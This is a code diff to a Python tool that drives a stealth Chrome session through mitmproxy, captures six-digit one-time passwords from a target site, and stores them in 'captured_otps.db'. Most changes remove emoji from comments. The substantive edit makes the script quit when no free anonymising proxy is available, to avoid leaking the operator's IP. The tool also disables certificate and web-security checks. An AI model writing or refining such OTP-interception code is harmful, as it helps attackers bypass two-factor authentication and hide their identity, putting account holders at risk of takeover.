@@ -25,19 +25,19 @@ from selenium_stealth import stealth
 import re
 import subprocess
 
-# 🔹 CONFIGURATIONS
+# CONFIGURATIONS
 CHROMEDRIVER_PATH = "/usr/bin/chromedriver"
 OTP_STORAGE_FILE = "captured_otps.db"
 otp_pattern = r"\b\d{6}\b"
 mitmproxy_port = 8082
 
-# 🔹 FREE PROXY API
+# FREE PROXY API
 PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=http"
 
-# 🔹 ENCRYPTION KEY (STORED IN MEMORY)
+# ENCRYPTION KEY (STORED IN MEMORY)
 key = get_random_bytes(16)
 
-# 🔹 SETUP DATABASE
+# SETUP DATABASE
 def setup_database():
     conn = sqlite3.connect(OTP_STORAGE_FILE)
     c = conn.cursor()
@@ -45,7 +45,7 @@ def setup_database():
     conn.commit()
     conn.close()
 
-# 🔹 FUNCTION TO ENCRYPT & STORE OTP IN DATABASE
+# FUNCTION TO ENCRYPT & STORE OTP IN DATABASE
 def store_otp(otp):
     conn = sqlite3.connect(OTP_STORAGE_FILE)
     c = conn.cursor()
@@ -56,7 +56,7 @@ def store_otp(otp):
     conn.commit()
     conn.close()
 
-# 🔹 KILL EXISTING PROCESSES ON PORT 8082
+# KILL EXISTING PROCESSES ON PORT 8082
 def kill_processes_using_port(port):
     for conn in psutil.net_connections(kind='inet'):
         if conn.laddr.port == port:
@@ -67,7 +67,7 @@ def kill_processes_using_port(port):
             except psutil.NoSuchProcess:
                 pass
 
-# 🔹 FETCH A FREE PROXY
+# FETCH A FREE PROXY
 def get_free_proxy():
     try:
         response = requests.get(PROXY_API_URL)
@@ -79,7 +79,7 @@ def get_free_proxy():
         print(f"⚠ Failed to fetch proxy: {e}")
     return None
 
-# 🔹 GUI TO DISPLAY OTP
+# GUI TO DISPLAY OTP
 class OTPGUI:
     def __init__(self, master):
         self.master = master
@@ -93,7 +93,7 @@ class OTPGUI:
         self.otp_label.config(text=f"Captured OTP: {otp}")
         messagebox.showinfo("OTP Captured", f"OTP: {otp}")
 
-# 🔹 MITMPROXY INTERCEPTOR
+# MITMPROXY INTERCEPTOR
 class OTPInterceptor:
     def __init__(self):
         self.gui = None
@@ -117,7 +117,7 @@ class OTPInterceptor:
         self.waiting_for_otp = True
         print("🚀 Waiting for OTP request...")
 
-# 🔹 START MITMPROXY IN BACKGROUND
+# START MITMPROXY IN BACKGROUND
 def start_mitmproxy(interceptor):
     options = Options(listen_host='127.0.0.1', listen_port=mitmproxy_port, ssl_insecure=True)
     m = DumpMaster(options)
@@ -130,7 +130,7 @@ def run_mitmproxy_thread(interceptor):
     mitmproxy_thread.daemon = True
     mitmproxy_thread.start()
 
-# 🔹 LAUNCH CHROME WITH PROXY & MITMPROXY
+# LAUNCH CHROME WITH PROXY & MITMPROXY
 def launch_chrome(target_url):
     chrome_options = ChromeOptions()
     free_proxy = get_free_proxy()
@@ -139,8 +139,8 @@ def launch_chrome(target_url):
         print(f"🆓 Using free proxy: {free_proxy}")
         chrome_options.add_argument(f"--proxy-server=http://{free_proxy}")
     else:
-        print("⚠ No free proxies available, using mitmproxy instead...")
-        chrome_options.add_argument(f"--proxy-server=http://127.0.0.1:{mitmproxy_port}")
+        print("❌ No free proxies available. Exiting to prevent IP leak.")
+        return None
 
     chrome_options.add_argument("--ignore-certificate-errors")
     chrome_options.add_argument("--disable-web-security")
@@ -155,7 +155,7 @@ def launch_chrome(target_url):
     driver.implicitly_wait(10)
     return driver
 
-# 🔹 MAIN FUNCTION
+# MAIN FUNCTION
 def main():
     kill_processes_using_port(mitmproxy_port)
     setup_database()
@@ -169,6 +169,9 @@ def main():
     messagebox.showinfo("Action Required", "🚀 Script will auto-detect OTP extraction method.")
 
     driver = launch_chrome(target_url)
+    if not driver:
+        return
+    
     interceptor.wait_for_otp()
     run_mitmproxy_thread(interceptor)
 
